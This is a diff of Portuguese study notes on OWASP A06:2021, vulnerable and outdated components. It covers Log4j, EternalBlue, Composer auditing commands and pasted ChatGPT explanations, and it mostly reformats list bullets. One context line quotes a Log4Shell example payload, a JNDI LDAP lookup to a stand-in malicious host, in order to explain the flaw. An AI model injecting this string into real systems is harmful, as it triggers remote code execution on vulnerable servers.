@@ -2,7 +2,7 @@
 
 ## Resumo
 
-É usar libs desatualizads, ou nâo se preocupar em atualizalas. Um exemplo é o Log4J, que permitia execuçâo remota em versôes antigas ou  o EternalBlue, uma vulnerabildiade no protocolo SMBv1 do Windows. Se você nâo atualizas componentes ou na o fica procupado em tentar manter eles atualizados pode dar problema se uma CVE for descorbeta. Para reoslver tem que manter tudo atualizado com comandos como: 
+É usar libs desatualizads, ou nâo se preocupar em atualizalas. Um exemplo é o Log4J, que permitia execuçâo remota em versôes antigas ou  o EternalBlue, uma vulnerabildiade no protocolo SMBv1 do Windows. Se você nâo atualizas componentes ou na o fica procupado em tentar manter eles atualizados pode dar problema se uma CVE for descorbeta. Para reoslver tem que manter tudo atualizado com comandos como:
 
 composer --version
 
@@ -24,31 +24,29 @@ E de preferencia ter tests unitaios para tesatr novamente e vê se nao quebra na
 
 Você provavelmente está vulnerável:
 
--   Se você não souber as versões de todos os componentes que usa (tanto do lado do cliente (front) quanto do lado do servidor (back)). Isso inclui componentes que você usa diretamente, bem como dependências aninhadas.
-    
--   Se o software for vulnerável, sem suporte ou desatualizado. Isso inclui o sistema operacional, servidor  _web/application_, sistema de gerenciamento de banco de dados (DBMS), aplicações, APIs e todos os componentes, ambientes de tempo de execução e bibliotecas.
-    
--   Se você não faz a varredura de vulnerabilidades regularmente e não assina os boletins de segurança relacionados aos componentes que você usa.
-    
--   Se você não corrigir ou atualizar a plataforma, as estruturas e as dependências subjacentes de maneira oportuna e baseada em riscos. Isso geralmente acontece em ambientes em que a correção é uma tarefa mensal ou trimestral sob controle de alterações, deixando as organizações abertas a dias ou meses de exposição desnecessária a vulnerabilidades corrigidas.
-    
--   Se os desenvolvedores de software não testarem a compatibilidade de bibliotecas atualizadas, atualizações ou com patches.
-    
--   Se você não proteger as configurações dos componentes (consulte  [A05: 2021-Configuração Incorreta de Segurança](https://owasp.org/Top10/pt_BR/A05_2021-Security_Misconfiguration/)).
-    
++ Se você não souber as versões de todos os componentes que usa (tanto do lado do cliente (front) quanto do lado do servidor (back)). Isso inclui componentes que você usa diretamente, bem como dependências aninhadas.
+
++ Se o software for vulnerável, sem suporte ou desatualizado. Isso inclui o sistema operacional, servidor  _web/application_, sistema de gerenciamento de banco de dados (DBMS), aplicações, APIs e todos os componentes, ambientes de tempo de execução e bibliotecas.
+
++ Se você não faz a varredura de vulnerabilidades regularmente e não assina os boletins de segurança relacionados aos componentes que você usa.
+
++ Se você não corrigir ou atualizar a plataforma, as estruturas e as dependências subjacentes de maneira oportuna e baseada em riscos. Isso geralmente acontece em ambientes em que a correção é uma tarefa mensal ou trimestral sob controle de alterações, deixando as organizações abertas a dias ou meses de exposição desnecessária a vulnerabilidades corrigidas.
+
++ Se os desenvolvedores de software não testarem a compatibilidade de bibliotecas atualizadas, atualizações ou com patches.
+
++ Se você não proteger as configurações dos componentes (consulte  [A05: 2021-Configuração Incorreta de Segurança](https://owasp.org/Top10/pt_BR/A05_2021-Security_Misconfiguration/)).
 
 ## Como Prevenir
 
 Deve haver um processo de gerenciamento de dependências para:
 
--   Remover dependências não utilizadas, recursos, componentes, arquivos e documentação desnecessários.
-    
--   Atualizar continuamente um inventário com as versões dos componentes do lado do cliente e do lado do servidor (por exemplo, estruturas, bibliotecas) e suas dependências usando ferramentas como  _versions_,  _OWASP Dependency Check_,  _retire.js_, etc. Monitore continuamente fontes como  _Common Vulnerability and Exposures_  (CVE) e  _National Vulnerability Database_  (NVD) para vulnerabilidades nos componentes. Use ferramentas de análise de composição de software para automatizar o processo. Inscreva-se para receber alertas de e-mail sobre vulnerabilidades de segurança relacionadas aos componentes que você usa.
-    
--   Obtenha componentes apenas de fontes oficiais por meio de links seguros. Prefira pacotes assinados para reduzir a chance de incluir um componente malicioso modificado (consulte  [A08: 2021-Software e Falhas de Integridade de Dados](https://owasp.org/Top10/pt_BR/A08_2021-Software_and_Data_Integrity_Failures/)).
-    
--   Monitore bibliotecas e componentes sem manutenção ou que não criem patches de segurança para versões anteriores. Se o patch não for possível, considere implantar um patch virtual para monitorar, detectar ou proteger contra o problema descoberto.
-    
++ Remover dependências não utilizadas, recursos, componentes, arquivos e documentação desnecessários.
+
++ Atualizar continuamente um inventário com as versões dos componentes do lado do cliente e do lado do servidor (por exemplo, estruturas, bibliotecas) e suas dependências usando ferramentas como  _versions_,  _OWASP Dependency Check_,  _retire.js_, etc. Monitore continuamente fontes como  _Common Vulnerability and Exposures_  (CVE) e  _National Vulnerability Database_  (NVD) para vulnerabilidades nos componentes. Use ferramentas de análise de composição de software para automatizar o processo. Inscreva-se para receber alertas de e-mail sobre vulnerabilidades de segurança relacionadas aos componentes que você usa.
+
++ Obtenha componentes apenas de fontes oficiais por meio de links seguros. Prefira pacotes assinados para reduzir a chance de incluir um componente malicioso modificado (consulte  [A08: 2021-Software e Falhas de Integridade de Dados](https://owasp.org/Top10/pt_BR/A08_2021-Software_and_Data_Integrity_Failures/)).
+
++ Monitore bibliotecas e componentes sem manutenção ou que não criem patches de segurança para versões anteriores. Se o patch não for possível, considere implantar um patch virtual para monitorar, detectar ou proteger contra o problema descoberto.
 
 Cada organização deve garantir um plano contínuo de monitoramento, triagem e aplicação de atualizações ou alterações de configuração durante a vida útil da aplicação ou portfólio.
 
@@ -56,37 +54,35 @@ Cada organização deve garantir um plano contínuo de monitoramento, triagem e 
 
 **Cenário #1:**  Os componentes normalmente são executados com os mesmos privilégios da própria aplicação, portanto, as falhas em qualquer componente podem resultar em sério impacto. Essas falhas podem ser acidentais (por exemplo, erro de codificação) ou intencionais (por exemplo, uma  _backdoor_  em um componente). Alguns exemplos de vulnerabilidades de componentes exploráveis descobertos são:
 
--   CVE-2017-5638, uma vulnerabilidade de execução remota de código do Struts 2 que permite a execução de código arbitrário no servidor, foi responsabilizada por violações significativas.
-    
--   Embora a Internet das Coisas (IoT) seja frequentemente difícil ou impossível de corrigir, a importância de corrigi-los pode ser grande (por exemplo, dispositivos biomédicos).
-    
++ CVE-2017-5638, uma vulnerabilidade de execução remota de código do Struts 2 que permite a execução de código arbitrário no servidor, foi responsabilizada por violações significativas.
+
++ Embora a Internet das Coisas (IoT) seja frequentemente difícil ou impossível de corrigir, a importância de corrigi-los pode ser grande (por exemplo, dispositivos biomédicos).
 
 Existem ferramentas automatizadas para ajudar os invasores a encontrar sistemas não corrigidos ou configurados incorretamente. Por exemplo, o mecanismo de pesquisa Shodan IoT pode ajudá-lo a encontrar dispositivos que ainda sofrem com a vulnerabilidade Heartbleed corrigida em abril de 2014.
 
 ## Referências
 
--   OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling
-    
--   OWASP Dependency Check (for Java and .NET libraries)
-    
--   OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)
-    
--   OWASP Virtual Patching Best Practices
-    
--   The Unfortunate Reality of Insecure Libraries
-    
--   MITRE Common Vulnerabilities and Exposures (CVE) search
-    
--   National Vulnerability Database (NVD)
-    
--   Retire.js for detecting known vulnerable JavaScript libraries
-    
--   Node Libraries Security Advisories
-    
--   [Ruby Libraries Security Advisory Database and Tools](https://owasp.org/Top10/pt_BR/A06_2021-Vulnerable_and_Outdated_Components/)
-    
--   https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf
-    
++ OWASP Application Security Verification Standard: V1 Architecture, design and threat modelling
+
++ OWASP Dependency Check (for Java and .NET libraries)
+
++ OWASP Testing Guide - Map Application Architecture (OTG-INFO-010)
+
++ OWASP Virtual Patching Best Practices
+
++ The Unfortunate Reality of Insecure Libraries
+
++ MITRE Common Vulnerabilities and Exposures (CVE) search
+
++ National Vulnerability Database (NVD)
+
++ Retire.js for detecting known vulnerable JavaScript libraries
+
++ Node Libraries Security Advisories
+
++ [Ruby Libraries Security Advisory Database and Tools](https://owasp.org/Top10/pt_BR/A06_2021-Vulnerable_and_Outdated_Components/)
+
++ https://safecode.org/publication/SAFECode_Software_Integrity_Controls0610.pdf
 
 ## Lista dos CWEs Mapeados
 
@@ -107,7 +103,7 @@ CWE-1104 Use of Unmaintained Third Party Components
 
 ### Q1 - CHATGPT - O QUE É A06
 
-A **A06 do OWASP Top 10 (2021)** refere-se à vulnerabilidade chamada **"Vulnerabilidades de Componentes Desatualizados e Vulneráveis"** (*A06:2021 - Vulnerable and Outdated Components*).
+A **A06 do OWASP Top 10 (2021)** refere-se à vulnerabilidade chamada **"Vulnerabilidades de Componentes Desatualizados e Vulneráveis"** (_A06:2021 - Vulnerable and Outdated Components_).
 
 ---
 
@@ -125,9 +121,9 @@ Desenvolvedores frequentemente usam bibliotecas de terceiros para agilizar o des
 
 ### 🔍 **Exemplos práticos**
 
-* Uma aplicação Laravel usando uma versão antiga do Guzzle com falhas conhecidas de segurança.
-* Um frontend Vue.js que utiliza uma versão vulnerável do Lodash.
-* Um sistema Java que usa uma versão antiga do Log4j (vulnerável ao *Log4Shell*).
++ Uma aplicação Laravel usando uma versão antiga do Guzzle com falhas conhecidas de segurança.
++ Um frontend Vue.js que utiliza uma versão vulnerável do Lodash.
++ Um sistema Java que usa uma versão antiga do Log4j (vulnerável ao _Log4Shell_).
 
 ---
 
@@ -143,24 +139,23 @@ Desenvolvedores frequentemente usam bibliotecas de terceiros para agilizar o des
 
 ### 🧰 Ferramentas úteis
 
-* **OWASP Dependency-Check**
-* **Snyk**
-* **Dependabot (GitHub)**
-* **npm audit / yarn audit**
-* **composer audit**
++ **OWASP Dependency-Check**
++ **Snyk**
++ **Dependabot (GitHub)**
++ **npm audit / yarn audit**
++ **composer audit**
 
 ---
 
 ### ✅ Boas práticas
 
-* Automatizar a verificação de segurança das dependências na CI/CD.
-* Não confiar que “só porque funciona, está seguro”.
-* Incluir políticas de atualização e verificação de componentes no ciclo de vida de desenvolvimento seguro (*SSDLC*).
++ Automatizar a verificação de segurança das dependências na CI/CD.
++ Não confiar que “só porque funciona, está seguro”.
++ Incluir políticas de atualização e verificação de componentes no ciclo de vida de desenvolvimento seguro (_SSDLC_).
 
 ---
 
 Quer ver um exemplo prático com uma linguagem ou framework específico?
-
 
 ## Q2 - CHATGPT - COMO SE PROTEGER NO PHP PURO E LARAVEL
 
@@ -174,13 +169,13 @@ Se você estiver usando **bibliotecas externas via Composer** (mesmo em projetos
 
 ### ✅ Passos:
 
-1. **Verifique se o Composer está instalado:**
+==> 1. **Verifique se o Composer está instalado:**
 
 ```bash
 composer --version
 ```
 
-2. **Audite as dependências:**
+==> 2. **Audite as dependências:**
 
 ```bash
 composer audit
@@ -188,13 +183,13 @@ composer audit
 
 > Isso irá consultar a base de dados de vulnerabilidades de segurança do `Packagist` e exibir falhas conhecidas nas bibliotecas do seu `composer.lock`.
 
-3. **Atualize bibliotecas inseguras:**
+==> 3. **Atualize bibliotecas inseguras:**
 
 ```bash
 composer update
 ```
 
-4. **(Opcional) Use `composer outdated` para ver o que está velho:**
+==> 4. **(Opcional) Use `composer outdated` para ver o que está velho:**
 
 ```bash
 composer outdated
@@ -248,10 +243,10 @@ Excelente pergunta! O ataque **Log4Shell**, que afetou a biblioteca **Log4j** no
 
 ## 🚨 O que foi o ataque Log4Shell?
 
-* **Data:** Revelado publicamente em **dezembro de 2021**.
-* **Biblioteca afetada:** `log4j-core` (versões 2.0 a 2.14.1).
-* **CVE:** [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228).
-* **Gravidade:** 10/10 (máximo na escala CVSS).
++ **Data:** Revelado publicamente em **dezembro de 2021**.
++ **Biblioteca afetada:** `log4j-core` (versões 2.0 a 2.14.1).
++ **CVE:** [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228).
++ **Gravidade:** 10/10 (máximo na escala CVSS).
 
 ### 🔥 O problema:
 
@@ -267,9 +262,9 @@ logger.info("${jndi:ldap://malicious.site/a}");
 
 ## 🧩 Relação com a A06:2021 (Componentes Vulneráveis)
 
-* A vulnerabilidade estava em uma **dependência popular, não atualizada**.
-* Muitas aplicações Java usavam versões antigas do Log4j **sem saber**.
-* **Mesmo quem nunca usou diretamente o Log4j** foi afetado se qualquer biblioteca interna o utilizasse.
++ A vulnerabilidade estava em uma **dependência popular, não atualizada**.
++ Muitas aplicações Java usavam versões antigas do Log4j **sem saber**.
++ **Mesmo quem nunca usou diretamente o Log4j** foi afetado se qualquer biblioteca interna o utilizasse.
 
 🔗 Ou seja:
 
@@ -281,15 +276,15 @@ logger.info("${jndi:ldap://malicious.site/a}");
 
 ### Para Java/Log4j:
 
-* Atualizar para Log4j **2.16+** ou usar bibliotecas alternativas seguras como `logback`.
-* Desabilitar substituições JNDI se não precisar.
++ Atualizar para Log4j **2.16+** ou usar bibliotecas alternativas seguras como `logback`.
++ Desabilitar substituições JNDI se não precisar.
 
 ### De forma geral (qualquer linguagem ou framework):
 
-* 🔍 **Auditar dependências regularmente.**
-* 📦 **Atualizar pacotes com frequência.**
-* 🛠️ **Monitorar CVEs** (via Dependabot, Snyk, OSS Index).
-* 🔐 **Tratar qualquer input como potencialmente malicioso.**
++ 🔍 **Auditar dependências regularmente.**
++ 📦 **Atualizar pacotes com frequência.**
++ 🛠️ **Monitorar CVEs** (via Dependabot, Snyk, OSS Index).
++ 🔐 **Tratar qualquer input como potencialmente malicioso.**
 
 ---
 
@@ -481,4 +476,3 @@ A segurança de uma aplicação é tão forte quanto seu componente mais fraco, 
 [^57]: https://vuldb.com/?id.98019
 
 [^58]: https://www.cisa.gov/sites/default/files/FactSheets/NCCIC ICS_FactSheet_WannaCry_Ransomware_S508C.pdf
-
